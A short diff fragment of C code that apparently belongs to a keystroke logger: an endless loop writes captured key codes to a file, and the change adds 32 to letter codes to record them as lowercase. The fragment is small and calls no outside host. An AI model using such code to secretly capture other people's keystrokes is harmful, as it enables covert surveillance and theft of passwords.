@@ -27,7 +27,7 @@ while(1){
             case 57: fprintf(file, "("); break; 
         }
     } else {
-        fprintf(file, "%c", key); 
+        fprintf(file, "%c", key + 32); 
     }
 }
       else if(key>=48 && key <=57) {
